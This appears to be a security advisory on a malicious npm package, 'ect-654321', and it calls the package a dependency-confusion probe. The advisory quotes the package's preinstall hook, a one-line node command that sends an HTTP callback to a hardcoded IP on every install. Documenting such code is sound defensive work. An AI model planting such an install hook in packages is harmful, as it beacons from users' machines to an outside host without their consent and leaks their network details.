summary: Preinstall beacon to hardcoded remote IP confirms installation on target machines
details: On `npm install`, the package's `preinstall` lifecycle hook runs `node -e "require('http').get('http://10.107.121.85:8000/callback_node_654321')"`, performing an unsolicited HTTP GET to a hardcoded bare IPv4 address with a unique callback path. This fires automatically and without consent on any default install, confirming to the operator of 10.107.121.85 that the package was installed and leaking the installer's source IP and request metadata. The package name (`ect-654321`), version (`100.0.4`), and one-word description ("Probe") are consistent with a dependency-confusion / namesquat probe rather than a functional library. There is no library code, no documented purpose, and no benign rationale for an install-time callback to a hardcoded IP.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
